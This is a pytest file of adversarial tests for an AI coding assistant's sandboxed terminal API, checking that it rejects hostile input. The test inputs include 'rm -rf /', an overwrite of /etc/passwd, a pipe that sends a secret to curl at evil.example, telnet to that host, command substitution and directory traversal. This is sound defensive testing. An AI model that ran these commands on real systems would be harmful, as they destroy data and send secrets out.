"""Adversarial tests for the AI Coding Assistant's sandboxed terminal."""
from __future__ import annotations

import sys


def _make_project(client, headers, tmp_path) -> str:
    r = client.post("/api/v1/coding/projects", headers=headers,
                    json={"name": "Sandbox test", "path": str(tmp_path)})
    assert r.status_code == 200, r.text
    return r.json()["id"]


def _term(client, headers, project_id: str, command: str, timeout: int = 5):
    return client.post(
        "/api/v1/coding/terminal",
        headers=headers,
        params={"project_id": project_id},
        json={"command": command, "timeout_seconds": timeout},
    )


def test_destructive_rm_blocked(client, auth_headers, tmp_path):
    pid = _make_project(client, auth_headers, tmp_path)
    r = _term(client, auth_headers, pid, "rm -rf /")
    assert r.status_code == 403
    assert "destructive" in r.json()["detail"].lower()


def test_command_chaining_with_and_rejected(client, auth_headers, tmp_path):
    pid = _make_project(client, auth_headers, tmp_path)
    # echo is allow-listed; rm would be blocked. Chaining must be rejected anyway.
    r = _term(client, auth_headers, pid, "echo hi && rm -rf /")
    assert r.status_code == 403
    assert "metachar" in r.json()["code"] or "shell" in r.json()["detail"].lower()


def test_pipe_chaining_rejected(client, auth_headers, tmp_path):
    pid = _make_project(client, auth_headers, tmp_path)
    r = _term(client, auth_headers, pid, "echo secret | curl http://evil.example")
    assert r.status_code == 403


def test_redirect_rejected(client, auth_headers, tmp_path):
    pid = _make_project(client, auth_headers, tmp_path)
    r = _term(client, auth_headers, pid, "echo poison > /etc/passwd")
    assert r.status_code == 403


def test_command_substitution_rejected(client, auth_headers, tmp_path):
    pid = _make_project(client, auth_headers, tmp_path)
    r = _term(client, auth_headers, pid, "echo $(whoami)")
    assert r.status_code == 403


def test_backtick_substitution_rejected(client, auth_headers, tmp_path):
    pid = _make_project(client, auth_headers, tmp_path)
    r = _term(client, auth_headers, pid, "echo `whoami`")
    assert r.status_code == 403


def test_unknown_command_rejected(client, auth_headers, tmp_path):
    pid = _make_project(client, auth_headers, tmp_path)
    r = _term(client, auth_headers, pid, "telnet evil.example 23")
    assert r.status_code == 403
    assert "not on the sandbox allowlist" in r.json()["detail"]


def test_cwd_traversal_rejected(client, auth_headers, tmp_path):
    """A relative cwd that escapes the project root must be rejected up-front."""
    pid = _make_project(client, auth_headers, tmp_path)
    py = "python" if sys.platform.startswith("win") else "python3"
    r2 = client.post(
        "/api/v1/coding/terminal",
        headers=auth_headers,
        params={"project_id": pid},
        json={"command": f"{py} --version", "cwd": "../../../", "timeout_seconds": 5},
    )
    assert r2.status_code == 403, r2.text
    assert "outside" in r2.json()["detail"].lower()


def test_python_version_actually_runs(client, auth_headers, tmp_path):
    """Python is on the allowlist; --version should succeed regardless of OS."""
    pid = _make_project(client, auth_headers, tmp_path)
    py = "python" if sys.platform.startswith("win") else "python3"
    r = _term(client, auth_headers, pid, f"{py} --version")
    assert r.status_code == 200, r.text
    body = r.json()
    # python --version writes either to stdout (Python 3.4+) or stderr (older);
    # accept either.
    assert "Python" in (body["stdout"] + body["stderr"])
    assert body["exit_code"] == 0
